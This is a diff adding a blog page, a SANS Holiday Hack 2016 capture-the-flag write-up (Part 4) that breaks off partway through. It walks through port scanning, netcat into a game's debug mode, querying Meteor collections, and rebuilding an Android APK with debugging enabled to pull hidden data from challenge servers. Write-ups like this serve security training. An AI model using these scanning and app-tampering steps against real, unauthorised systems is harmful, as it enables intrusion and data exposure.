@@ -1,0 +1,1574 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.11.2 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Part 4: My Gosh… It’s Full of Holes - josh@blog:~$ cat README.txt</title>
+<meta name="description" content="SANS Holiday Hack 2016 Writeup - The Challenges - Part 4">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="josh@blog:~$ cat README.txt">
+<meta property="og:title" content="Part 4: My Gosh… It’s Full of Holes">
+<meta property="og:url" content="http://localhost:4000/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/">
+
+
+  <meta property="og:description" content="SANS Holiday Hack 2016 Writeup - The Challenges - Part 4">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/sans-2016.png">
+
+
+
+  <meta name="twitter:site" content="@jtomkiel">
+  <meta name="twitter:title" content="Part 4: My Gosh… It’s Full of Holes">
+  <meta name="twitter:description" content="SANS Holiday Hack 2016 Writeup - The Challenges - Part 4">
+  <meta name="twitter:url" content="http://localhost:4000/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/sans-2016.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2016-03-06T00:00:00-08:00">
+
+
+
+  <meta property="article:modified_time" content="2016-03-06T10:56:50-08:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/">
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "Organization",
+      "url": "http://localhost:4000",
+      "logo": "http://localhost:4000/assets/images/bio-photo.jpg"
+    }
+  </script>
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Josh Tomkiel",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="josh@blog:~$ cat README.txt Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">josh@blog:~$ cat README.txt</a>
+        <ul class="visible-links">
+          
+            
+            <li class="masthead__menu-item">
+              <a href="http://localhost:4000/about/" >About</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="http://localhost:4000/year-archive/" >Posts</a>
+            </li>
+          
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Josh Tomkiel" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Josh Tomkiel</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Information Security Professional
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">127.0.0.1</span>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:jtomkiel+blog@gmail.com">
+            <meta itemprop="email" content="jtomkiel+blog@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/jtomkiel" itemprop="sameAs">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/jtomkiel" itemprop="sameAs">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Part 4: My Gosh… It’s Full of Holes">
+    <meta itemprop="description" content="SANS Holiday Hack 2016 Writeup - The Challenges - Part 4">
+    <meta itemprop="datePublished" content="March 06, 2016">
+    <meta itemprop="dateModified" content="March 06, 2016">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Part 4: My Gosh… It’s Full of Holes
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  22 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="notice--danger">Question 7: ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS… For each of those six items, which vulnerabilities did you discover and exploit?</p>
+
+<p class="notice--danger">Question 8: What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)</p>
+
+<p>Below is the list of the six (6) vulnerable servers to target. Each hosting a hidden ‘discombobulatedaudio’ MP3 file.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Target</th>
+      <th style="text-align: center">IP Address</th>
+      <th style="text-align: right">DNS</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">The Mobile Analytics Server (via credentialed login access)</td>
+      <td style="text-align: center">104.198.252.157</td>
+      <td style="text-align: right">analytics.northpolewonderland.com</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">The Mobile Analytics Server (post authentication)</td>
+      <td style="text-align: center">104.198.252.157</td>
+      <td style="text-align: right">analytics.northpolewonderland.com</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">The Dungeon Game</td>
+      <td style="text-align: center">35.184.47.139</td>
+      <td style="text-align: right">dungeon.northpolewonderland.com</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">The Debug Server</td>
+      <td style="text-align: center">35.184.63.245</td>
+      <td style="text-align: right">dev.northpolewonderland.com</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">The Banner Ad Server</td>
+      <td style="text-align: center">104.198.221.240</td>
+      <td style="text-align: right">ads.northpolewonderland.com</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">The Uncaught Exception Handler Server</td>
+      <td style="text-align: center">104.154.196.33</td>
+      <td style="text-align: right">ex.northpolewonderland.com</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>All target servers were discovered within the same file inside the SantaGram APK file.</p>
+
+<h3 id="the-dungeon-game">The Dungeon Game</h3>
+
+<p>One of the elves (Pepper Minstix) provides a link to an <a href="https://www.northpolewonderland.com/dungeon.zip">offline version</a> of the game ‘Dungeon’.  A text based adventure game created at the Programming Technology Division of the MIT Laboratory for Computer Science.  It also goes by the name ‘Zork’.</p>
+
+<p>Extracting the ZIP file reveals two (2) files.</p>
+
+<ul>
+  <li>Linux ELF executable (dungeon)</li>
+  <li>DAT file (dtextc.dat)</li>
+</ul>
+
+<p>After some research, it seemed that all the good stuff was stored in the DAT file.  Running <code class="highlighter-rouge">strings</code> didn’t turn up anything useful on either file.  A <a href="https://www.google.com/search?num=100&amp;q=decode+dungeon+dtextc.dat&amp;oq=decode+dungeon+dtextc.dat">Google search</a> revealed that there was a way to decode the dtextc.dat file.</p>
+
+<p><a href="http://web.mit.edu/jhawk/src/cdungeon-decode.c">http://web.mit.edu/jhawk/src/cdungeon-decode.c</a></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads $ curl -O http://web.mit.edu/jhawk/src/cdungeon-decode.c</span>
+  <span class="s">% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span>
+                                 <span class="s">Dload  Upload   Total   Spent    Left  Speed</span>
+<span class="s">100 70303  100 70303    0     0  69473      0  0:00:01  0:00:01 --:--:-- 69538</span>
+
+<span class="s">josh@MacBook-Pro ~/Downloads $ gcc cdungeon-decode.c -o cdungeon-decode</span>  <span class="c1"># A few warnings were generated but it still compiled.</span>
+</code></pre></div></div>
+
+<p>Running the decode script…</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode</span>
+<span class="s">Copyright (c) Ian Lance Taylor 1991 &lt;ian@airs.com&gt;</span>
+<span class="na">Usage</span><span class="pi">:</span> <span class="s">data -[aobn] [inputfile(s)] -[aobns] [outputfile(s)]</span>
+       <span class="s">-a ASCII (readable) format; one file</span>
+          <span class="s">input default stdin, output default stdout</span>
+       <span class="s">-o old (f77) format; index file, text file</span>
+          <span class="s">input default library files, output default local files</span>
+       <span class="s">-b new compressed binary format; one file</span>
+          <span class="s">input default library file, output default local file</span>
+       <span class="s">-n is a synonym for -b</span>
+       <span class="s">-s creates a sequential file (Alpha Micro only)</span>
+</code></pre></div></div>
+<p>Feeding it the .dat file and specifying the output text file…</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode -n dungeon/dtextc.dat -a dungeon/dtextc.txt</span>
+</code></pre></div></div>
+<p>Searching for the text <code class="highlighter-rouge">elf</code> within the new text file…</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads $ cat dungeon/dtextc.txt | grep -i -A1 -B1 'elf'</span>
+<span class="s">&lt;!--OUTPUT TRUNCATED--&gt;</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1023</span>
+ <span class="s">The elf, willing to bargain, says "What's in it for me?"</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1024</span>
+<span class="s">--</span>
+<span class="s">--</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1024</span>
+ <span class="s">The elf, satisified with the trade says -</span>
+ <span class="s">Try the online version for the </span><span class="no">true</span><span class="s"> prize</span>
+<span class="s">--</span>
+<span class="s">--</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1026</span>
+ <span class="s">The elf appears increasingly impatient.</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1027</span>
+<span class="s">--</span>
+<span class="s">--</span>
+<span class="na">Message</span><span class="pi">:</span> <span class="s">1027</span>
+ <span class="s">The elf says - you have conquered this challenge - the game will now end.</span>
+</code></pre></div></div>
+
+<p>Looks like <code class="highlighter-rouge">Message: 1024</code> would hold the information needed, but it says to “try the online version.”  There is also a Debug Mode (GDT) for this game per <a href="http://gunkies.org/wiki/Zork_hints">http://gunkies.org/wiki/Zork_hints</a>.  Using the GDT mode can take me right to the message I want to see using the <code class="highlighter-rouge">TD</code> command to ‘Display Text’.</p>
+
+<p>Time to see what ports are open on this host.  A quick <code class="highlighter-rouge">nmap</code> scan with service detection (-sV) hitting all TCP ports (-p-) should tell us more. Out of habit, I also save the results locally (-oA). This saves the output in the three major formats (.xml, .gnmap, and .nmap) at once.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads $ nmap -sV -p- dungeon.northpolewonderland.com -oA dungeon.northpolewonderland.com</span>
+
+<span class="s">Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 12:24 EST</span>
+<span class="s">Nmap scan report for dungeon.northpolewonderland.com (35.184.47.139)</span>
+<span class="s">Host is up (0.047s latency).</span>
+<span class="s">rDNS record for 35.184.47.139</span><span class="pi">:</span> <span class="s">139.47.184.35.bc.googleusercontent.com</span>
+<span class="na">Not shown</span><span class="pi">:</span> <span class="s">65531 closed ports</span>
+<span class="s">PORT      STATE    SERVICE    VERSION</span>
+<span class="s">22/tcp    open     ssh        OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span>
+<span class="s">25/tcp    filtered smtp</span>
+<span class="s">80/tcp    open     http       nginx 1.6.2</span>
+<span class="s">11111/tcp open     tcpwrapped</span>
+<span class="na">Service Info</span><span class="pi">:</span> <span class="na">OS</span><span class="pi">:</span> <span class="s">Linux; CPE</span><span class="pi">:</span> <span class="s">cpe:/o:linux:linux_kernel</span>
+
+<span class="s">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="na">Nmap done</span><span class="pi">:</span> <span class="s">1 IP address (1 host up) scanned in 30.91 seconds</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">TCP 11111</code> looks interesting.  Let’s netcat to that port.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/Downloads/dungeon $ nc dungeon.northpolewonderland.com 11111</span>
+<span class="s">Welcome to Dungeon.</span><span class="err">			</span><span class="s">This version created 11-MAR-78.</span>
+<span class="s">You are in an open field west of a big white house with a boarded</span>
+<span class="s">front door.</span>
+<span class="s">There is a small wrapped mailbox here.</span>
+<span class="pi">&gt;</span><span class="err">GDT</span>   
+<span class="err">G</span><span class="no">DT&gt;DT</span>
+<span class="err">E</span><span class="no">ntry:    1024</span>
+<span class="err">T</span><span class="no">he elf, satisified with the trade says -</span>
+<span class="err">s</span><span class="no">end email to "peppermint@northpolewonderland.com" for that which you seek.</span>
+</code></pre></div></div>
+
+<p>Next, I sent an e-mail off to <code class="highlighter-rouge">peppermint@northpolewonderland.com</code> and moments later, receive the following automated response…</p>
+
+<p><img src="/assets/images/sans2016/email_response.png" alt="email_response" /></p>
+
+<blockquote>
+  <p>The Dungeon Game challenge is complete!</p>
+</blockquote>
+
+<h3 id="the-banner-ad-server">The Banner Ad Server</h3>
+
+<p>At first glance, <code class="highlighter-rouge">http://ads.northpolewonderland.com</code> seems to be a basic webpage without much going on.</p>
+
+<p><img src="/assets/images/sans2016/ad_site2.png" alt="banner_AD1" /></p>
+
+<p>Viewing the page source discloses that the site is using Meteor release version <code class="highlighter-rouge">METEOR@1.4.2.3</code>,  which was released on November 17, 2016 according to the <a href="https://github.com/meteor/meteor/releases">GitHub release timeline</a>.</p>
+
+<p><img src="/assets/images/sans2016/ad_pagesource.png" alt="banner_AD_source" /></p>
+
+<p>Luckily, there was a recent SANS blog post titled <a href="https://pen-testing.sans.org/blog/2016/12/06/mining-meteor">Mining Meteor</a>.  Following the guidance in that post, I installed the <a href="https://tampermonkey.net">TamperMonkey</a> add-on in Firefox and setup the <a href="https://github.com/nidem/MeteorMiner">MeteorMiner</a> script to help visualize the active subscriptions and the collections for Meteor.</p>
+
+<p>Firefox’s browser developer tools (specifically the web console) will help with this challenge tremendously.</p>
+
+<p>Now that the <code class="highlighter-rouge">TamperMonkey</code> with the <code class="highlighter-rouge">MeteorMiner</code> script was active, I’ll load the page again.  The default pages shows 4 records under <code class="highlighter-rouge">HomeQuotes</code> under <code class="highlighter-rouge">Collections</code> (1).</p>
+
+<p><img src="/assets/images/sans2016/ad_4_HomeQuotes.png" alt="banner_AD2" /></p>
+
+<p>It’s also worth noting that the <a href="https://github.com/nidem/MeteorMiner">MeteorMiner</a> script helps identify pages that would not have been accessible otherwise. The pages were listed under <code class="highlighter-rouge">Routes</code>.  Click the arrow to the right of <code class="highlighter-rouge">/admin/quotes</code> (1) and that will take you to the <code class="highlighter-rouge">/admin/quotes</code> page.</p>
+
+<p>While there may not be anything useful displayed on the page, a new record appeared within the <code class="highlighter-rouge">HomeQuotes</code> (2) section under <code class="highlighter-rouge">Collections</code>.</p>
+
+<p><img src="/assets/images/sans2016/ad_5_HomeQuotes.png" alt="banner_AD3" /></p>
+
+<p>To see everything that’s included within <code class="highlighter-rouge">adminQuotes</code>, open the Firefox web console (from the keyboard: press Ctrl+Shift+K or Cmd+Option+K on a Mac)</p>
+
+<p>With the web console open, type <code class="highlighter-rouge">HomeQuotes.find().fetch()</code> then press enter to display all the objects (1).  Click on the fifth object (2) to see the link to the the audio file (3).</p>
+
+<p><img src="/assets/images/sans2016/ad_site_audiofile.png" alt="banner_AD_flag" /></p>
+
+<p>Thanks to <code class="highlighter-rouge">MeteorMiner</code>, the collections information was visible and I knew exactly what to query from within the Firefox web console.</p>
+
+<p><code class="highlighter-rouge">http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3</code></p>
+
+<blockquote>
+  <p>Banner Ad Server complete!</p>
+</blockquote>
+
+<h3 id="the-debug-server">The Debug Server</h3>
+
+<p>Completing the Debug Server challenge required changing the APK file.  By default, debug mode on the StantaGram app is disabled.  In <a href="/challenges/#part-2-awesome-package-konveyance">Part 2</a>, I covered how to extract an APK file with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>.</p>
+
+<p>I’ll pick up from already having the SantaGram app decompiled.</p>
+
+<p>Let’s do a case insensitive (-i), recursive (-r), <code class="highlighter-rouge">grep</code> command to see where the word <code class="highlighter-rouge">debug</code> appears in any files within the StantaGram_4.2 directory…</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i -r "debug" .</span>
+<span class="s">./res/values/public.xml</span><span class="pi">:</span>    <span class="s">&lt;public type="string" name="debug_data_collection_url" id="0x7f07001d" /&gt;</span>
+<span class="s">./res/values/public.xml</span><span class="pi">:</span>    <span class="s">&lt;public type="string" name="debug_data_enabled" id="0x7f07001e" /&gt;</span>
+<span class="s">./res/values/strings.xml</span><span class="pi">:</span>    <span class="s">&lt;string name="debug_data_collection_url"&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;</span>
+<span class="s">./res/values/strings.xml</span><span class="pi">:</span>    <span class="s">&lt;string name="debug_data_enabled"&gt;false&lt;/string&gt;</span>
+<span class="s">./smali/android/support/v7/view/menu/h.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;</span>
+<span class="s">./smali/android/support/v7/view/menu/h.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;</span>
+<span class="s">./smali/android/support/v7/widget/ActionMenuView$c.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$ExportedProperty;</span>
+<span class="s">./smali/android/support/v7/widget/ActionMenuView$c.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$ExportedProperty;</span>
+<span class="s">./smali/android/support/v7/widget/ActionMenuView$c.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$ExportedProperty;</span>
+<span class="s">./smali/android/support/v7/widget/ActionMenuView$c.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$ExportedProperty;</span>
+<span class="s">./smali/android/support/v7/widget/ActionMenuView$c.smali</span><span class="pi">:</span>    <span class="s">.annotation runtime Landroid/view/ViewDebug$ExportedProperty;</span>
+<span class="s">./smali/com/northpolewonderland/santagram/b.smali</span><span class="pi">:</span>    <span class="s">invoke-static {}, Landroid/os/Debug;-&gt;getNativeHeapAllocatedSize()J</span>
+<span class="s">./smali/com/northpolewonderland/santagram/EditProfile.smali</span><span class="pi">:</span>    <span class="s">const-string v3, "Remote debug logging is Enabled"</span>
+<span class="s">./smali/com/northpolewonderland/santagram/EditProfile.smali</span><span class="pi">:</span>    <span class="s">const-string v1, "debug"</span>
+<span class="s">./smali/com/northpolewonderland/santagram/EditProfile.smali</span><span class="pi">:</span>    <span class="s">const-string v3, "Remote debug logging is Disabled"</span>
+<span class="s">./smali/com/northpolewonderland/santagram/EditProfile.smali</span><span class="pi">:</span>    <span class="s">const-string v3, "Error posting JSON debug data</span><span class="pi">:</span> <span class="s2">"</span>
+<span class="s">./smali/com/northpolewonderland/santagram/SplashScreen.smali:</span><span class="nv">    </span><span class="s">invoke-static</span><span class="nv"> </span><span class="s">{},</span><span class="nv"> </span><span class="s">Landroid/os/Debug;-&gt;getNativeHeapAllocatedSize()J</span>
+<span class="s">./smali/com/parse/Parse.smali:.field</span><span class="nv"> </span><span class="s">public</span><span class="nv"> </span><span class="s">static</span><span class="nv"> </span><span class="s">final</span><span class="nv"> </span><span class="s">LOG_LEVEL_DEBUG:I</span><span class="nv"> </span><span class="s">=</span><span class="nv"> </span><span class="s">0x3</span>
+</code></pre></div></div>
+
+<p>Of all the matches, the file <code class="highlighter-rouge">./res/values/strings.xml</code> looked promising.  The file was edited to change the <code class="highlighter-rouge">debug_data_enabled=false</code> to <code class="highlighter-rouge">true</code>. It’s worth noting that the <code class="highlighter-rouge">EditProfile.smali</code> appears to check if debug mode is enabled or not.  Time to change the file, rebuild, then upload to the emulator.</p>
+
+<p>The APK rebuild process is covered very well in the <a href="https://www.youtube.com/watch?v=mo2yZVRicW0">Manipulating Android Applications</a> video.  Watch this to understand how to setup your environment and how to sign the APK file.</p>
+
+<p>I also installed the Burp proxy certificate on the Android emulator.  To do this, follow the steps in <a href="https://support.portswigger.net/customer/portal/questions/12817785-how-to-use-burp-proxy-with-an-emulated-android-device-">this post</a> from the PortSwigger support forum.</p>
+
+<p>I wrote a quick bash script to automate the process of removing the APK from the emulator, building a new version, signing it, and reinstalling.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016 $ cat quick_apk.sh</span>
+<span class="c1">#!/bin/bash</span>
+
+<span class="s">echo [*] Uninstalling APK</span>
+<span class="c1">## Uninstall</span>
+<span class="s1">'</span><span class="s">/Users/josh/Library/Android/sdk/platform-tools/adb'</span> <span class="s">uninstall com.northpolewonderland.santagram</span>
+
+<span class="s">echo [*] Building new APK</span>
+<span class="c1">## Build New APK</span>
+<span class="s">java -jar '/Users/josh/HolidayHack2016/apktool_2.2.1.jar' b SantaGram_4.2</span>
+
+<span class="s">echo [*] Signing new APK</span>
+<span class="c1">## Sign New APK</span>
+<span class="s1">'</span><span class="s">/Applications/Android</span><span class="nv"> </span><span class="s">Studio.app/Contents/jre/jdk/Contents/Home/bin/jarsigner'</span> <span class="s">-sigalg SHA1withRSA -digestalg SHA1 -keystore /Users/josh/HolidayHack2016/keys/SantaGram.keystore /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk SantaGram</span>
+
+<span class="s">sleep 1</span>
+
+<span class="s">echo [*] Installing new APK</span>
+<span class="c1">## Install New APK</span>
+<span class="s1">'</span><span class="s">/Users/josh/Library/Android/sdk/platform-tools/adb'</span> <span class="s">install /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk</span>
+
+<span class="s">echo [!] Complete</span>
+</code></pre></div></div>
+
+<p>The updated APK with the modified <code class="highlighter-rouge">strings.xml</code> file has been loaded into the emulator.  Time to login to the app and visit the Edit Profile section.</p>
+
+<p><img src="/assets/images/sans2016/debug1.png" alt="debug1" /></p>
+
+<p>Burp shows a POST request sent to <code class="highlighter-rouge">http://dev.northpolewonderland.com</code> after entering the Edit Profile section.  Let’s select that request and send it to repeater to play with the JSON parameters.</p>
+
+<p><img src="/assets/images/sans2016/debug2.png" alt="debug1" /></p>
+
+<p>The image above shows the original request and response.  The response includes <code class="highlighter-rouge">"verbose":false</code>, what if <code class="highlighter-rouge">"verbose":true</code> was included in the request?</p>
+
+<p><img src="/assets/images/sans2016/debug3.png" alt="debug1" /></p>
+
+<p>Look at that. Because the information being sent from the client (me) is not validated server side, I am able to view the verbose information which includes the debug audio file.  Ideally, if sensitive information is included in the verbose response, only approved specified users should be able to successfully request that information.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016 $ curl -O http://dev.northpolewonderland.com/debug-20161224235959-0.mp3</span>
+  <span class="s">% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span>
+                                 <span class="s">Dload  Upload   Total   Spent    Left  Speed</span>
+<span class="s">100  212k  100  212k    0     0   743k      0 --:--:-- --:--:-- --:--:--  744k</span>
+<span class="s">josh@MacBook-Pro ~/HolidayHack2016 $ file debug-20161224235959-0.mp3</span>
+<span class="s">debug-20161224235959-0.mp3</span><span class="pi">:</span> <span class="s">Audio file with ID3 version 2.3.0, contains</span><span class="pi">:</span> <span class="s">MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>The Debug Server is complete!</p>
+</blockquote>
+
+<h3 id="the-uncaught-exception-handler-server">The Uncaught Exception Handler Server</h3>
+
+<p>Much like in the previous Debug Server challenge, finding the audio file within the Uncaught Exception Handler Server required going back into the SantaGram APK decompiled folder and making modifications to the source code of the app.  Most apps do not trigger exceptions (crashes) when using the app normally (at least you hope not). Let’s make sure this app triggers an exception and watch what happens.</p>
+
+<p>In <a href="/challenges/#part-2-awesome-package-konveyance">Part 2</a>, I covered how to extract an APK file with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>.</p>
+
+<p>I’ll pick up from already having the SantaGram app decompiled. I already know from the Debug Server challenge that the <code class="highlighter-rouge">EditProfile.smali</code> file is called when pressing the Edit Profile button.  With this information, it is possible to tweak that file causing a targeted exception when the Edit Profile button is pressed.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i "exception" ./smali/com/northpolewonderland/santagram/EditProfile.smali</span>
+    <span class="s">.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0</span>
+    <span class="s">move-exception v1</span>
+    <span class="s">invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V</span>
+    <span class="s">.catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0</span>
+    <span class="s">move-exception v0</span>
+    <span class="s">invoke-virtual {v0}, Ljava/lang/Exception;-&gt;getMessage()Ljava/lang/String;</span>
+</code></pre></div></div>
+<p>A quick grep for the word <code class="highlighter-rouge">exception</code> within the EditProfile.smali file has some hits.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i "exception" ./smali/com/northpolewonderland/santagram/EditProfile.smali</span>
+    <span class="s">.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0</span>
+    <span class="s">move-exception v1</span>
+    <span class="s">invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V</span>
+    <span class="s">.catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0</span>
+    <span class="s">move-exception v0</span>
+    <span class="s">invoke-virtual {v0}, Ljava/lang/Exception;-&gt;getMessage()Ljava/lang/String;</span>
